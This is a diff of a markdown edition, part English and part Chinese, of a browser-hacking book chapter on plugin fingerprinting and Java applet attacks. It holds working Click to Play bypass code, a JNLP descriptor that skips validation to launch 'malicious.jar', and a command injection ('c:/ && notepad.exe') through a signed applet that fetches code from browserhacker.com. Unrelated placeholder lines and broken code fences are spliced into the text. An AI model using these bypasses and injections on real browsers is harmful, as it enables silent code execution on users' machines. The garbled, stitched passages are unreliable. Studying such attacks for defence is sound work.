+Apple joined the party of companies blocking plugins in early 2013 when it blocked Java 7 to protect users from a vulnerable version. To do this, Apple pushed a configuration file change to its antimalware software, Xprotect, to block the Java plugin. To view what’s blocked on your Mac, you can view the plist XML file at `/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/Xprotect.plist`.
 
-For the same vulnerability, Active X kill bits were released to help prevent the vulnerable software from running in Windows. By adding the correct kill bit values at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\ActiveX Compatibility, you can force the plugin to not load in Internet Explorer for specific versions, without having to block the plugin as a whole.
+For the same vulnerability, Active X kill bits were released to help prevent the vulnerable software from running in Windows. By adding the correct kill bit values at `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\ActiveX Compatibility`, you can force the plugin to not load in Internet Explorer for specific versions, without having to block the plugin as a whole.
 
 Firefox lacks some of these enterprise capabilities; however, the built-in blacklist successfully blocks known malicious plugins. The Java plugin was also added to the Firefox blacklist, which is auto-updated. Although this may cause issues for enterprise users, it can always be re-enabled.
 
@@ -9059,7 +9074,7 @@ Detecting plugins is fairly easy to do, both manually and automatically. Some pl
 
 In this section you first examine how to manually query the browser for plugins. Then, in the following sections, you see how to leverage frameworks and plugins to automatically detect plugin versions for attack purposes.
 
-Firefox and Chrome make this task fairly easy by surfacing the list of plugins that are installed in the navigator.plugins DOM object. You can build a quick web page to query this for yourself and output the elements in a table using the information from the Mozilla reference:
+Firefox and Chrome make this task fairly easy by surfacing the list of plugins that are installed in the `navigator.plugins` DOM object. You can build a quick web page to query this for yourself and output the elements in a table using the information from the Mozilla reference:
 
 ```
 <HTML>
@@ -9072,7 +9087,6 @@ document.write(
   "<TR><TH>Name</TH><TH>Filename</TH>" + 
   "<TH>Description</TH><TH>Version</TH></TR>\n"
 );
-
 for(var i = 0; i < pluginLen; i++) {
   document.write(
     "<TR><TD>"+
@@ -9092,13 +9106,11 @@ document.write("</TABLE>");
 </HTML>
 ```
 
-
-
 当你将此保存为 HTML 文件并加载到浏览器中时，它会输出一个类似于图 8-4 的表格，列出每个插件及其版本。该表格包括可直接调用的活动插件，以及“点击即播放”的插件，因此某些插件可能需要额外的干预。
 
 在图 8-4 中，你可以看到运行前面代码片段的结果，该片段是枚举 `navigator.plugins` DOM 对象。
 
-``` 
+```
 start figure 
 ```
 
@@ -9106,14 +9118,15 @@ start figure
 
 ![c08f004.tif](img/c08f004.png)
 
-``` 
+```
 end figure 
-```
 
-通过 `navigator.mimeTypes` DOM 对象在 Firefox 和 Chrome 中可以进行其他检测。通过该对象返回的数组进行查询，可以验证它返回的内容要么是 MimeType 对象，要么是 undefined。通过使用前面章节“通过 DOM 指纹识别”的“!!”技巧（如第 6 章所述），很容易基于 MIME 类型判断 Flash 是否已安装：
+
+
+通过 `navigator.mimeTypes` DOM 对象在 Firefox 和 Chrome 中可以进行其他检测。通过该对象返回的数组进行查询，可以验证它返回的内容要么是 `MimeType` 对象，要么是 `undefined`。通过使用前面章节“通过 DOM 指纹识别”的“`!!`”技巧（如第 6 章所述），很容易基于 MIME 类型判断 Flash 是否已安装：
 
 ```
->>> `!!navigator.mimeTypes["application/x-shockwave-flash"]` 
+>>> !!navigator.mimeTypes["application/x-shockwave-flash"]
 true
 ```
 
@@ -9121,41 +9134,45 @@ true
 
 ```
 flash_versions = 11;
+
 flash_installed = false;
+
 objname = "ShockwaveFlash.ShockwaveFlash.";
+
 if (window.ActiveXObject) {
+
   for (x = 2; x <= flash_versions; x++) {
+
     try {
+
       Flash = eval("new ActiveXObject('" + objname + x + "');");
+
       if (Flash) {
+
         flash_installed = true; 
+
       }
+
     } catch (e) { }
+
   }
+
 }
 ```
 
-代码执行完毕后，flash_installed 为 true 表示 Flash 已安装，为 false 表示未安装。你可能注意到这里检查了 10 种 Flash 版本（从 2 到 11）。每种 Flash 的 ActiveX 对象名称不同，因此在遍历名称时，当创建 ActiveX 对象时，就知道了对应的版本已安装。相比 Firefox 和 Chrome，这种方式更繁琐，但由于无法通过 DOM 直接访问插件，这是在 IE 中识别插件的最有效方法。
+代码执行完毕后，`flash_installed` 为 `true` 表示 Flash 已安装，为 `false` 表示未安装。你可能注意到这里检查了 10 种 Flash 版本（从 2 到 11）。每种 Flash 的 ActiveX 对象名称不同，因此在遍历名称时，当创建 ActiveX 对象时，就知道了对应的版本已安装。相比 Firefox 和 Chrome，这种方式更繁琐，但由于无法通过 DOM 直接访问插件，这是在 IE 中识别插件的最有效方法。
 
 ## 自动插件检测
 
-现在你已经掌握了使用 JavaScript 手动检测插件的方法，可以转向大规模自动插件检测。了解如何构建插件检查将有助于扩展自动化框架。许多 referenced 框架中，Eric Gerds 编写的 PluginDetect7 框架是常被引用的。通过使用包装 JavaScript 类以及子模块，你可以构建轻量级 JavaScript 查询模块，用于检查多种不同类型的插件。
+现在你已经掌握了使用 JavaScript 手动检测插件的方法，可以转向大规模自动插件检测。了解如何构建插件检查将有助于扩展自动化框架。许多 referenced 框架中，Eric Gerds 编写的 `PluginDetect7` 框架是常被引用的。通过使用包装 JavaScript 类以及子模块，你可以构建轻量级 JavaScript 查询模块，用于检查多种不同类型的插件。
 
 这类框架能够快速识别所有已安装的插件，这些插件可能值得攻击者目标。在很多情况下，用户甚至不知道他们的插件已被检测。然而，从 Internet Explorer 8 开始的某些浏览器会通过弹窗提示用户。因此，在生产环境中使用 ActiveX 检查前，最好先进行测试。
 
-虽然 PluginDetect 是构建插件检查的强大工具，如果你仅想获取自己的插件列表并检查它们是否为最新版本，Mozilla 网站 8 提供了插件检查站点。该站点不仅遍历你的插件，还检查其状态。图 8-5 展示了 Mozilla 插件检查站点的输出结果，显示部分模块需要更新，而部分模块站点未识别。
-
-``` 
-start figure 
-```
+虽然 `PluginDetect` 是构建插件检查的强大工具，如果你仅想获取自己的插件列表并检查它们是否为最新版本，Mozilla 网站 8 提供了插件检查站点。该站点不仅遍历你的插件，还检查其状态。图 8-5 展示了 Mozilla 插件检查站点的输出结果，显示部分模块需要更新，而部分模块站点未识别。
 
 **Figure 8-5:** Mozilla 插件状态页面，显示需要更新的插件
 
 ![c08f005.tif](img/c08f005.png)
-
-``` 
-end figure 
-```
 
 插件状态页面能够检测到许多常见插件，但如图 8-5 所示，仍可能存在站点未识别的插件。站点会提供如何研究这些插件版本的信息。
 
@@ -9165,31 +9182,15 @@ end figure
 
 BeEF 在浏览器被钩连后，会自动执行一系列插件检查。图 8-6 展示了 BeEF 默认在钩连浏览器时执行的插件信息，包括 Flash、VLC 等检查在初始化时运行。
 
-``` 
-start figure 
-```
-
 **Figure 8-6:** 正在钩连的浏览器插件列表
 
 ![c08f006.tif](img/c08f006.png)
 
-``` 
-end figure 
-```
-
 针对这些自动任务，BeEF 会在不可见用户的情况下尝试进行额外插件指纹识别。对于其他手动 BeEF 插件，某些可能会触发用户通知。图 8-7 展示了可用于检测其他插件的命令。
-
-``` 
-start figure 
-```
 
 **Figure 8-7:** BeEF 额外插件检测命令
 
 ![c08f007.tif](img/c08f007.png)
-
-``` 
-end figure 
-```
 
 四种不同的灯光颜色表示 BeEF 插件的警报状态。绿色插件通常不会向用户显示正在被检测的事实。灰色插件要么无法工作，要么影响极小。橙色插件通常存在边界条件，可能会向用户发出警报；例如，插件存在时可能不触发警报，但不存在时用户可能会注意到异常（反之亦然）。红色插件通常会向用户警示你的活动。基于这些交通灯信号，你可以选择模块并针对浏览器执行，进一步确定可能的可利用漏洞模块。
 
@@ -9207,201 +9208,287 @@ end figure
 
 ### Firefox 示例
 
+- 过去曾出现过 Click to Play 的错误，这些错误允许插件自动显示。本·墨雷菲（Ben Murphy）发现了一个有趣的绕过方法，并且该方法一直对 Firefox 起效，直到 2013 年 3 月。Proof of Concept 很简单但有效：
 
+  ```
+  <html>
 
+    <head>
 
--   [过去曾出现过 Click to Play 的错误，这些错误允许插件自动显示。本·墨雷菲（Ben Murphy）发现了一个有趣的绕过方法，并且该方法一直对 Firefox 起效，直到 2013 年 3 月。[Proof of Concept 很简单但有效：]
+      <style type='text/css
 
-```
-<html>
-  <head>
-    <style type='text/css
-css'>
-       #overlay {
-         background-color: black;
-         position: absolute;
-         top: 0px;
-         left: 0px;
-         width: 550px;
-         height: 450px;
-         color: white;
-         text-align: center;
-         padding-top: 100px;
-         pointer-events: none;
-       }
-    </style>
-    <body>
-      <div id="overlay">Click here</div>
-      <applet code="Foo.class" width="500" height="500"/>
-  </body>
-</html>
-```
+  css'>
 
--   [通过指定 `pointer-events: none`，可以阻止对黑色 #overlaydiv 的任何鼠标事件触发。随后可以诱导用户点击 “Click here” 信息，从而执行 Java Applet（如图 8-8 所示）。]
+        #overlay {
 
-**Figure 8-8:** Click to Play 绕过执行未签名的 Java Applet
+          background-color: black;
 
-![c08f008.tif](img/c08f008.png)
+          position: absolute;
 
-end figure 
+          top: 0px;
 
--   [通过动态修改 overlay div 的 CSS 定义，并加入 `opacity: 0.4`，可以看到 overlay 后面的内容（如图 8-9 所示）。利用此技巧以及一定的社交工程，用户实际上是在点击 Click to Play 对话框。]
+          left: 0px;
 
-**Figure 8-9:** 添加透明度以显示背后的内容
+          width: 550px;
 
-![c08f009.tif](img/c08f009.png)
+          height: 450px;
 
-end figure 
+          color: white;
 
--   [Firefox 会通过在地址栏左上方显示红色插件图标提示插件已过期。不够专注的用户仍可能点击黑色 div。图 8-8 与图 8-9 中均可见红色警告图标。]
+          text-align: center;
 
--   [当此类漏洞被发现时，补丁通常会很快发布，导致定位受影响的浏览器往往是“捡起即丢”。精确的浏览器指纹识别有助于判断目标浏览器是否易受攻击。还可以构建逻辑，决定如何最佳交付插件以最大化激活概率。]
+          padding-top: 100px;
+
+          pointer-events: none;
+
+        }
+
+      </style>
+
+      <body>
+
+        <div id="overlay">Click here</div>
+
+        <applet code="Foo.class" width="500" height="500"/>
+
+    </body>
+
+  </html>
+  ```
+
+- 通过指定 `pointer-events: none`，可以阻止对黑色 `#overlaydiv` 的任何鼠标事件触发。随后可以诱导用户点击 “Click here” 信息，从而执行 Java Applet（如图 8-8 所示）。
+
+  **Figure 8-8:** Click to Play 绕过执行未签名的 Java Applet
+
+  ![c08f008.tif](img/c08f008.png)
+
+- 通过动态修改 overlay div 的 CSS 定义，并加入 `opacity: 0.4`，可以看到 overlay 后面的内容（如图 8-9 所示）。利用此技巧以及一定的社交工程，用户实际上是在点击 Click to Play 对话框。
+
+  **Figure 8-9:** 添加透明度以显示背后的内容
+
+  ![c08f009.tif](img/c08f009.png)
+
+- Firefox 会通过在地址栏左上方显示红色插件图标提示插件已过期。不够专注的用户仍可能点击黑色 div。图 8-8 与图 8-9 中均可见红色警告图标。
+
+- 当此类漏洞被发现时，补丁通常会很快发布，导致定位受影响的浏览器往往是“捡起即丢”。精确的浏览器指纹识别有助于判断目标浏览器是否易受攻击。还可以构建逻辑，决定如何最佳交付插件以最大化激活概率。
 
 ### Java 示例
 
--   [从 Java 7 更新 11 开始，Oracle 修改了 Click to Play 的实现，使得即使是未签名的 Applet 也会显示。这大幅削弱了利用 Java 漏洞和 SOP 绕过进行攻击的效果。]
+- 从 Java 7 更新 11 开始，Oracle 修改了 Click to Play 的实现，使得即使是未签名的 Applet 也会显示。这大幅削弱了利用 Java 漏洞和 SOP 绕过进行攻击的效果。
 
--   [Click to Play 的实现中存在若干错误，常常允许在无需用户交互的情况下执行 Java Applet。第一个绕过（编号 10）由 Esteban Guillardoy 在 Java 7 更新 13 中修复，利用了一个“较少人知”的 Applet 属性 `object` 来加载序列化的 Applet。]
+- Click to Play 的实现中存在若干错误，常常允许在无需用户交互的情况下执行 Java Applet。第一个绕过（编号 10）由 Esteban Guillardoy 在 Java 7 更新 13 中修复，利用了一个“较少人知”的 Applet 属性 `object` 来加载序列化的 Applet。
 
--   [如果查看 Java 的 `Plugin2Manager` 类的源码，可以看到 Click to Play 逻辑。具体在 `initAppletAdapter()` 方法中，若使用 `code` 属性实例化 Applet，则会调用 `fireAppletSSVValidation()` 方法：]
+- 如果查看 Java 的 `Plugin2Manager` 类的源码，可以看到 Click to Play 逻辑。具体在 `initAppletAdapter()` 方法中，若使用 `code` 属性实例化 Applet，则会调用 `fireAppletSSVValidation()` 方法：
 
-```
-void initAppletAdapter(AppletExecutionRunnable
-  paramAppletExecutionRunnable)
-  throws ClassNotFoundException, IllegalAccessException,
-  ExitException, JRESelectException, IOException,
-  InstantiationException {
- long l = DeployPerfUtil.put(
-    0L,"Plugin2Manager.createApplet() - BEGIN");
- /*
-  * Get the values of the "code" and "object" applet attributes
-  */  
- String str1 = getSerializedObject();
- String str2 = getCode();
+  ```
+  void initAppletAdapter(AppletExecutionRunnable
 
- [...snip...]
+    paramAppletExecutionRunnable)
 
- if ((str2 != null) && (str1 != null)) {
-  System.err.println(amh.getMessage("runloader.err"));
-  throw new InstantiationException(
-    "Either \"code\" or \"object\"" + 
-    " should be specified, but not both.");
- }
- if ((str2 == null) && (str1 == null))
-  return;
- if (str2 != null) {
-  /*
-   * Load applet normally through the "code" attribute. 
-   * Fires the CtP pop=up, waiting for user intervention.
-   */
-   if (fireAppletSSVValidation()) {
-    appletSSVRelaunch();
-   }
+    throws ClassNotFoundException, IllegalAccessException,
+
+    ExitException, JRESelectException, IOException,
+
+    InstantiationException {
+
+   long l = DeployPerfUtil.put(
+
+      0L,"Plugin2Manager.createApplet() - BEGIN");
+
+   /*
+
+    * Get the values of the "code" and "object" applet attributes
+
+    */  
+
+   String str1 = getSerializedObject();
+
+   String str2 = getCode();
+
    [...snip...]
- } else {
-  if (!this.isSecureVM)
-   return;
-  // load the Serialized applet through the "object" attribute
-  this.adapter.instantiateSerialApplet(localPlugin2ClassLoader, str1);
-  this.doInit = false;
-  DeployPerfUtil
-    .put("Plugin2Manager.createApplet()" + 
-      " - post: secureVM .. serialized .. ");
- }
 
-[...snip...] 
+   if ((str2 != null) && (str1 != null)) {
 
- DeployPerfUtil.put(l, "Plugin2Manager.initAppletAdapter() - END");
-}
+    System.err.println(amh.getMessage("runloader.err"));
+
+    throw new InstantiationException(
+
+      "Either \"code\" or \"object\"" + 
+
+      " should be specified, but not both.");
+
+   }
+
+   if ((str2 == null) && (str1 == null))
+
+    return;
+
+   if (str2 != null) {
+
+    /*
+
+     * Load applet normally through the "code" attribute. 
+
+     * Fires the CtP pop=up, waiting for user intervention.
+
+     */
+
+     if (fireAppletSSVValidation()) {
+
+      appletSSVRelaunch();
+
+     }
+
+     [...snip...]
+
+   } else {
+
+    if (!this.isSecureVM)
+
+     return;
+
+    // load the Serialized applet through the "object" attribute
+
+    this.adapter.instantiateSerialApplet(localPlugin2ClassLoader, str1);
+
+    this.doInit = false;
+
+    DeployPerfUtil
+
+      .put("Plugin2Manager.createApplet()" + 
+
+        " - post: secureVM .. serialized .. ");
+
+   }
+
+  [...snip...] 
+
+   DeployPerfUtil.put(l, "Plugin2Manager.initAppletAdapter() - END");
+
+  }
+  ```
+
+- 当未使用 `code` 属性而使用 `object` 属性时，Java 会直接加载序列化的 Applet，而不会触发 Click to Play。
+
+- 要利用此缺陷，可在嵌入标签中使用以下代码：
+
+  ```
+  <embed object="object.ser" 
+
+  type="application/x-java-applet;version=1.6">
+  ```
+
+- 另一个由 Esteban 发现的绕过（编号 12）在 Java 7 更新 21 中被修复。该绕过依赖于通过 Java Network Launching Protocol（JNLP）描述符传递一个隐藏参数。JNLP 可用于启动 Applet，并且可以指定 Applet 运行所需的 Java 版本。
+
+- 在分析 Java 的 `PluginMain` 类的 `performSSVValidation()` 方法时，可注意到如下代码：
+
+  ```
+  public static boolean performSSVValidation
+
+          (Plugin2Manager paramPlugin2Manager)
+
+          throws ExitException {
+
+    boolean bool = Boolean.valueOf(paramPlugin2Manager.
+
+                     getParameter("__applet_ssv_validated")).
+
+                        booleanValue();
+
+    if (bool)
+
+      return false;
+
+    LaunchDesc localLaunchDesc = null;
+
+    AppInfo localAppInfo = null;
+
+    [...snip...]
+
+  }
+  ```
+
+- 注意到未记录的 `__applet_ssv_validated` 参数，若其值为 `true`，则会跳过所有检查直接返回。正常 Applet 调用会因参数名以 `_` 开头而被排除，但通过 JNLP 描述符调用时并受此限制。
+
+- 因此，可以通过在 JNLP 描述符中使用该隐藏参数来绕过 Click to Play 限制。
+
+- 下面是一个示例 JNLP 描述符：
+
+  ```
+  <?xml version="1.0" encoding="utf-8"?> 
+
+  <jnlp spec="1.0" xmlns:jfx=http://javafx.com
+
+   href="applet_security_bypass.jnlp"> 
+
+    <information> 
+
+      <title>Applet Test JNLP</title> 
+
+      <vendor>Oracle</vendor> 
+
+      <description>Esteban CtP bypass</description> 
+
+      <offline-allowed/> 
+
+    </information> 
+
+     <resources> 
+
+          <j2se version="1.7" 
+
+            href="http://java.sun.com/products/autodl/j2se" /> 
+
+          <jar href="malicious.jar" main="true" /> 
+
+    </resources> 
+
+    <applet-desc 
+
+       name="Malicious Applet" 
+
+       main-class="Main" 
+
+       width="1" 
+
+       height="1"> 
+
+       <param name="__applet_ssv_validated" value="true"></param> 
+
+   </applet-desc> 
+
+   <update check="background"/> 
+
+  </jnlp>
+  ```
+
+- 隐藏参数需要在 JNLP 文件的 Applet 描述部分指定：
+
+  ```
+  <param name="__applet_ssv_validated" value="true"></param>
+  ```
+
+
+
+进入 `/path/to/xxx` 目录，找到 `xxx.json`。
+
+在表达式 `cvar = avar + bvar` 中，加法运算符（`+`）将 `avar` 与 `bvar` 相加，得到它们的和 `cvar`
+
+在 `List.of(arg0, arg1, arg2)` 中，`List` 接口的工厂方法 `of()` 接受一系列的元素，返回包含它们的只读列表。
+
+之后我们这样调用 `cmd` 命令：`cmd arg0 arg1 arg2`。
+
+```
+if (condVar > someVal) {console.log("xxx")}
 ```
 
--   [当未使用 `code` 属性而使用 `object` 属性时，Java 会直接加载序列化的 Applet，而不会触发 Click to Play。]
-
--   [要利用此缺陷，可在嵌入标签中使用以下代码：]
-
-```
-<embed object="object.ser" 
-type="application/x-java-applet;version=1.6">
-```
-
--   [另一个由 Esteban 发现的绕过（编号 12）在 Java 7 更新 21 中被修复。该绕过依赖于通过 Java Network Launching Protocol（JNLP）描述符传递一个隐藏参数。JNLP 可用于启动 Applet，并且可以指定 Applet 运行所需的 Java 版本。]
-
--   [在分析 Java 的 `PluginMain` 类的 `performSSVValidation()` 方法时，可注意到如下代码：]
-
-```
-public static boolean performSSVValidation
-        (Plugin2Manager paramPlugin2Manager)
-        throws ExitException {
-
-  boolean bool = Boolean.valueOf(paramPlugin2Manager.
-                   getParameter("__applet_ssv_validated")).
-                      booleanValue();
-  if (bool)
-    return false;
-  LaunchDesc localLaunchDesc = null;
-  AppInfo localAppInfo = null;
-  
-  [...snip...]
-}
-```
-
--   [注意到未记录的 `__applet_ssv_validated` 参数，若其值为 `true`，则会跳过所有检查直接返回。正常 Applet 调用会因参数名以 `_` 开头而被排除，但通过 JNLP 描述符调用时并受此限制。]
-
--   [因此，可以通过在 JNLP 描述符中使用该隐藏参数来绕过 Click to Play 限制。]
-
--   [下面是一个示例 JNLP 描述符：]
-
-```
-<?xml version="1.0" encoding="utf-8"?> 
-<jnlp spec="1.0" xmlns:jfx=http://javafx.com
- href="applet_security_bypass.jnlp"> 
-  <information> 
-    <title>Applet Test JNLP</title> 
-    <vendor>Oracle</vendor> 
-    <description>Esteban CtP bypass</description> 
-    <offline-allowed/> 
-  </information> 
-  
-   <resources> 
-        <j2se version="1.7" 
-          href="http://java.sun.com/products/autodl/j2se" /> 
-        <jar href="malicious.jar" main="true" /> 
-  </resources> 
-  <applet-desc 
-     name="Malicious Applet" 
-     main-class="Main" 
-     width="1" 
-     height="1"> 
-     <param name="__applet_ssv_validated" value="true"></param> 
- </applet-desc> 
- <update check="background"/> 
-</jnlp>
-```
-
--   [隐藏参数需要在 JNLP 文件的 Applet 描述部分指定：]
-
-```
-<param name="__applet_ssv_validated" value="true"></param> 
-```
-
--   [最后一步是从 Web 服务器提供该 JNLP 文件，并在触发 Applet 执行的页面中引用它，示例代码如下：]
-
-
-
-
-<x0.666><y0.2857>Unsigned applet warning with Java 1.7 greater than update 11
+- [最后一步是从 Web 服务器提供该 JNLP 文件，并在触发 Applet 执行的页面中引用它，示例代码如下：]
 
 ![c08f010.tif](img/c08f010.png)
 
-end figure
-
 **Figure 8-10:** Unsigned applet warning with Java 1.7 greater than update 11
 
-<x0.666><y0.2857>Output from the JVersion applet
-
 ![c08f011.tif](img/c08f011.png)
-
-end figure
 
 **Figure 8-11:** The output from the JVersion applet
 
@@ -9419,7 +9506,7 @@ It’s important to understand what Java applets are, how they interact with the
 
 Actions like accessing the file system or executing operating system commands are blocked by default. The Java security model requires code to be trusted or permission to be given before accessing functionality that has security implications. Much of the security research around Java revolves around bypassing security measures. That is, to break out of the sandbox and gain access to the underlying file system, the ability to execute additional code, and the ability to break out of the browser itself.
 
-One aspect of Java code that is useful to understand is the relationship between Java code and the resulting compiled class file. Java code is compiled into bytecode that is then processed by the Java Virtual Machine (JVM). The JVM processes the bytecode and then executes it. Applications can convert bytecode back into representative Java code as well, usually called decompilers, which you will learn more about later in the chapter.
+One aspect of Java code that is useful to understand is the relationship between Java code and the resulting compiled class file. Java code is compiled into bytecode that is then processed by the Java Virtual Machine (`JVM`). The `JVM` processes the bytecode and then executes it. Applications can convert bytecode back into representative Java code as well, usually called decompilers, which you will learn more about later in the chapter.
 
 What an applet is allowed to do is controlled by its permissions. Primarily these permissions dictate how the applet interacts with the system through the sandbox. A core difference between a signed applet and an unsigned applet is that a signed applet can execute code outside of the sandbox.
 
@@ -9435,26 +9522,37 @@ Before you can execute any Java attacks, you could choose to identify whether or
 
 Once an applet is running, Java can access version strings from inside the applet itself. An unsigned applet has enough permission to achieve this as well. Your goal is to get the user to execute an applet, catch the result, and then send the result back to you for further targeting. With newer versions of Java, starting from Java 1.7 update 11, this requires the user to explicitly allow unsigned applet execution.
 
-The following code snippet uses the System.getProperty method to retrieve the Java version and vendor. This is called in the execute function and is returned as a string:
+The following code snippet uses the `System.getProperty` method to retrieve the Java version and vendor. This is called in the `execute` function and is returned as a string:
 
 ```
 import java.applet.*;
+
 import java.awt.*;
+
 public class JVersion extends Applet{ 
+
   public JVersion() {
+
     super();
+
     return;
+
   }
 
 public static String execute() {
+
   return (" Java Version: " +
+
      System.getProperty("java.version")+
+
      " by "+System.getProperty("java.vendor"));
+
   }
+
 } 
 ```
 
-The following HTML and JavaScript snippet executes the preceding Java code to create an object in the page and then uses JavaScript to call the execute method of that object. This is written to the screen using the document.write method:
+The following HTML and JavaScript snippet executes the preceding Java code to create an object in the page and then uses JavaScript to call the `execute` method of that object. This is written to the screen using the `document.write` method:
 
 ```
 <object id='JVersion' name='JVersion'>
@@ -9463,31 +9561,25 @@ The following HTML and JavaScript snippet executes the preceding Java code to cr
   <param name='archive' 
   value='http://browserhacker.com/JVersion.jar' />
 </object>
+
 <script>
    document.write(document.JVersion.execute());
 </script>
 ```
- start figure
 
 **Figure 8-10:** Unsigned applet warning with Java 1.7 greater than update 11
 
 ![c08f010.tif](img/c08f010.png)
 
-end figure
-
 **Figure 8-11:** The output from the JVersion applet
 
 ![c08f011.tif](img/c08f011.png)
-
-end figure
 
 Regardless of these detection methods, as of Java version 1.7 update 11, it’s recommended that the best way to execute malicious Java applets is to simply run them without prior Java detection. This is due to the browser asking the user for permission before running the applet, regardless of whether it’s Java detection code or an unsigned malicious applet.
 
 ### Reversing Java Applets
 
 When you encounter a trusted Java applet, your goals are to reverse the applet’s code, understand its inner workings, and then look for potential flaws. Part of the challenge is that the code itself can’t be modified directly. If the applet takes arguments from a web page, it may be possible to determine weaknesses in the applet itself that lead to exploitation. In this scenario, you are effectively exploiting a weakness in a trusted applet in order to exploit a host.
-
-
 
 为了找到这些弱点，你必须检查 `applet` 本身。为此，你首先需要找到一个 `Java` 反编译工具，例如 `JD-GUI`。反编译工具会将 `Java` 字节码转换回可浏览的代码。使用 `JD-GUI18` 应用，你可以拆解 `Java` Applet 以查找弱点，然后确定如何修改网页以利用这些弱点。你可能会偶尔遇到带有一定混淆的 `Java` Applet 代码，在这种情况下可能需要花费一些时间对代码进行去混淆。
 
@@ -9505,38 +9597,50 @@ When you encounter a trusted Java applet, your goals are to reverse the applet�
   value='http://browserhacker.com/signedAppletCmdExec.jar' />
   <param name='debug' value='true' />
   <param name='dir' value='c:/' />
+```
+
+
+
 </object>
-```
 
+```
 这段示例代码指示浏览器执行 `signedAppletCmdExec` 类，并从 `signedAppletCmdExec.jar` 文件中加载。它将 `debug` 参数设为 `true`，`dir` 设为 `c:/`。当浏览器运行代码时，参数会传递给 `Java`，`debug` 与 `dir` 的值在 Applet 中可用。要最终运行 Applet，还需要下面的 `JavaScript` 代码：
-
 ```
+
 <script>
-try {
-    output = document.signedAppletCmdExec.execute();
-    console.log("output: " + output);
-    return;
-}catch (e) {
-    console.log("timeout");
-      return;
-}
-</script>
-```
 
+try {
+
+    output = document.signedAppletCmdExec.execute();
+
+    console.log("output: " + output);
+
+    return;
+
+}catch (e) {
+
+    console.log("timeout");
+
+      return;
+
+}
+
+</script>
+
+```
 这段 `JavaScript` 代码创建了一个函数，用于访问 Applet 并调用 Applet 内部的 `execute` 方法。它还会把 Applet 输出的信息打印到浏览器控制台。运行此代码后，你会在 Figure 8-12 中看到输出。
 
- start figure 
+start figure
 
 **Figure 8-12:** `cmd.exe` 窗口显示 `C:\\` 提示符
 
 ![c08f012.tif](img/c08f012.png)
 
- end figure 
+end figure
 
 掌握了这段代码的行为后，似乎可以利用脆弱的 `Java` Applet 执行任意操作系统命令。为了确定具体方法，你需要了解代码在 `Java` 内部是如何被调用的。这正是需要拆解 `Java` 代码、调查 `cmd.exe` 是如何被调用的地方。
 
 首先，你需要从 `.jar` 文件中提取 `.class` 文件。下载 `.jar` 文件并保存到临时目录。要从 `.jar` 文件中提取内容，输入以下命令。记住，`.jar` 文件本质上是包含所有必要的 `Java` 类文件和相关内容的 `.zip` 文件：
-
 ```
 $ jar xvf signedAppletCmdExec.jar 
  inflated: META-INF/MANIFEST.MF
@@ -9546,21 +9650,19 @@ $ jar xvf signedAppletCmdExec.jar
  inflated: signedAppletCmdExec.class
  inflated: RelaxedSecurityManager.class
 ```
-
 你会看到除了 META-INF 相关的签名信息外，还提取出了两个类文件，它们包含已编译的 Applet 代码字节码。接下来，启动 `JD-GUI` 应用并双击 `signedAppletCmdExec.class`。加载后，你应该看到类似 Figure 8-13 的内容。
 
- start figure 
+start figure
 
 **Figure 8-13:** `JD-GUI` 显示提取的源码
 
 ![c08f013.tif](img/c08f013.png)
 
- end figure 
+end figure
 
 代码片段中有两个重要之处。第一，Applet 正在覆盖默认的安全管理器，以降低执行命令所需的权限。如果不显式授予 Applet 权限，或像本例那样授予全部权限，Applet 会抛出安全异常并拒绝执行命令。第二，`str2` 变量用于设置要执行的命令，并结合传入的 `dir` 参数。
 
 这些信息告诉你，如何执行额外的操作系统命令。要利用这一发现，你需要提供额外的命令，让 `cmd.exe` 执行它们。由于原始命令不会直接显示在屏幕上，追加的命令是透明的。为了验证，可以将初始 HTML 代码修改为：
-
 ```
 <object id='signedAppletCmdExec'
   classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93'
@@ -9573,18 +9675,17 @@ $ jar xvf signedAppletCmdExec.jar
 <param name='dir' value='c:/ && notepad.exe' />
 <object id=’signedAppletCmdExec’>
 ```
-
 高亮的修改导致 `cmd.exe` 在 `Java` Applet 执行时切换到 `c:/` 目录，然后启动 `notepad.exe`。重新加载攻击页面后，你应该看到类似 Figure 8-14 的输出。`cmd.exe` 标题会改变，显示正在执行 `notepad.exe`。但如果执行速度很快，用户可能根本注意不到短暂的变化。
 
 这为执行 Metasploit Meterpreter 负载提供了很好的机会，能够快速迁移到其他进程。其他攻击手段包括添加本地用户，或在拥有适当权限的情况下，甚至提升到域管理员（如果目标在 Windows 域中拥有提升权限）。
 
- start figure 
+start figure
 
 **Figure 8-14:** 受信任 Applet 启动 `cmd.exe` 并 `notepad.exe`
 
 ![c08f014.tif](img/c08f014.png)
 
- end figure 
+end figure
 
 这一情形展示了如何通过脆弱的 `Java` Applet 来利用操作系统命令执行。然而，思考更高级的 `Java` Applet 时，情况会不同。
 
@@ -9598,14 +9699,11 @@ $ jar xvf signedAppletCmdExec.jar
 
 还需考虑前面两个 `Java` 代码示例。每个示例都让你能够利用已签名的 Applet 将 `JavaScript` 与 `Java` Applet 关联，这是在不使用漏洞的情况下进行操作系统操作的唯一途径。正如你所见，这可能会触发警报，还需要配合社交工程或其他攻击手段才能使其成为有效的攻击。
 
+- 一个被沙箱绕过的著名漏洞是 `CVE-2013-0422`，它针对的是 Java 1.7 更新 9 到 10 之间的版本。与许多 Java 漏洞一样，这个漏洞最初是在野外发现的，随后被去混淆、分析，最终被修补。去混淆后的代码首次公开发布于 Security Obscurity。20 The applet 代码可从 [`https://browserhacker.com`](https://browserhacker.com) 获得。
 
+这个漏洞利用的依据是 Java Reflection API。21 Reflection 是在运行时检查和修改对象行为的能力。在此特定情况下，通过使用 Reflection，可以获取 `com.sun.jmx.mbeanserver.MBeanInstantiator` 实例，然后调用 `findClass()` 方法。有了这种可能性，你就可以加载额外的类，并在实践中调用你自定义的类，该类会调用常规的 `Runtime.getRuntime().exec()` 方法来执行操作系统命令。
 
-
--   一个被沙箱绕过的著名漏洞是 `CVE-2013-0422`，它针对的是 Java 1.7 更新 9 到 10 之间的版本。与许多 Java 漏洞一样，这个漏洞最初是在野外发现的，随后被去混淆、分析，最终被修补。去混淆后的代码首次公开发布于 Security Obscurity。20 The applet 代码可从 [`https://browserhacker.com`](https://browserhacker.com) 获得。
-
